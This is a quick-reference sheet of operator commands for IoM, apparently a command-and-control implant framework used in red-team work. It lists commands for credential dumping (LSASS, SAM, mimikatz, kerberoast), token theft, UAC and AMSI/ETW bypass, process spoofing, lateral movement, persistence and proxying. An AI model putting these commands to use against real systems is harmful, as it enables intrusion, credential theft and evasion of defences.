# IoM Command Quick Reference

## Client Commands (no session context required)

### Connection and Authentication
```
login <auth_file>                # Log in using a .auth file
```

### Session Management
```
session                          # List active sessions
session --all                    # List all sessions
use <session_id>                 # Enter a session (supports prefix matching)
background                       # Return to main menu
```

### Infrastructure
```
listener                         # List listeners
pipeline list                    # List pipelines
pipeline tcp --name <n> --host <h> --port <p>   # Create a TCP pipeline
pipeline start --name <n>        # Start a pipeline
pipeline stop --name <n>         # Stop a pipeline
```

### Build
```
build                            # Build an implant
armory list                      # List available artifacts
armory search <keyword>          # Search for artifacts
```

---

## Implant Commands (requires `use <session>` to enter context first)

### Basic Information
```
sysinfo                          # System info (OS, arch, hostname, process path)
whoami                           # Current user and SID
privs                            # Current privilege list
sleep <seconds>                  # Set heartbeat interval
suicide                          # Terminate the implant
```

### File System
```
ls [path]                        # List directory
pwd                              # Current directory
cd <path>                        # Change directory
cat <file>                       # Read file
rm <path>                        # Delete
mkdir <path>                     # Create directory
cp <src> <dst>                   # Copy
mv <src> <dst>                   # Move
chmod <mode> <path>              # Change permissions (Linux)
chown <owner> <path>             # Change owner (Linux)
```

### File Transfer
```
upload <local_path> <remote_path>   # Upload a file to the target
download <remote_path>              # Download a file from the target
```

### Command Execution
```
shell <command>                  # Execute via cmd.exe/sh
powershell <command>             # Execute via PowerShell
execute_exe <path> [args]        # Execute PE (sacrificial process)
execute_dll <path> [args]        # Execute DLL
execute_assembly <path> [args]   # Execute .NET assembly
execute_shellcode <path>         # Execute shellcode
bof <path> [args]                # Execute BOF (inline, no new process)
inline_exe <path> [args]         # Inline PE execution
inline_dll <path> [args]         # Inline DLL execution
inline_assembly <path> [args]    # Inline .NET assembly execution
powerpick -s <script> -- <cmd>   # PowerShell execution without powershell.exe
```

**Sacrificial process protection options** (execute_exe/dll/shellcode/assembly):
```
--ppid <pid>                     # Parent PID spoofing
--block_dll                      # Block non-Microsoft DLLs
--etw                            # Disable ETW
--argue "notepad.exe"            # Argument spoofing
--process "C:\...\svchost.exe"   # Custom sacrificial process
```

**.NET / PowerShell bypass**:
```
bypass --amsi --etw              # Pre-bypass AMSI and ETW
execute_assembly --amsi <path>   # Execute with AMSI bypass
```

### System Operations
```
ps                               # Process list
kill <pid>                       # Kill a process
env                              # Environment variables
netstat                          # Network connections
ipconfig                         # Network interfaces
```

### Enumeration
```
enum av                          # Detect security products
enum software                    # Installed software
enum dc                          # Domain controller info
systeminfo                       # System details
```

### Privilege Operations
```
privs                            # View privileges
getsystem                        # Elevate to SYSTEM
runas --username <u> --password <p> --program <cmd>  # Run as another user
rev2self                         # Revert to original token
token steal --pid <pid>          # Steal a process token
token make --username <u> --password <p> --domain <d>  # Create a token
```

### Privilege Escalation
```
uac-bypass <method> <command>    # UAC bypass
elevate <method>                 # Potato / kernel exploit escalation
```

### Credentials
```
hashdump                         # SAM hash dump
logonpasswords                   # LSASS credentials
credman                          # Credential Manager
mimikatz <commands>              # Full mimikatz
nanodump [options]               # Advanced LSASS dump
domain kerberoast                # Kerberoast
klist                            # Kerberos tickets
```

### Lateral Movement
```
move psexec --host <ip> --service <name> --path <file>
move wmi-proccreate --target <ip> --command <cmd>
move dcom --target <ip> --cmd <cmd>
move krb_ptt --ticket <base64>
```

### Network Discovery
```
pingscan --target <cidr>         # Ping sweep
portscan --target <ip> --ports <ports>  # Port scan
nslookup --host <hostname>       # DNS lookup
```

### Domain Operations
```
ldapsearch --query "<filter>"    # LDAP query
domain sessions                  # Domain sessions
```

### Persistence
```
persistence Registry_Key --artifact_name <name>
persistence Install_Service --artifact_name <name>
persistence Scheduled_Task --artifact_name <name>
persistence startup_folder --use_malefic_as_custom_file
persistence NewLnk --artifact_name <name> --lnkname <name>
```

### Network Proxying and Forwarding
```
proxy start --port <port>        # Start a SOCKS proxy
forward add --from <local> --to <remote>   # Port forwarding
reverse add --from <remote> --to <local>   # Reverse forwarding
```

### Task Management
```
tasks                            # List tasks
tasks --task-id <id>             # View details
tasks cancel --task-id <id>      # Cancel a task
```
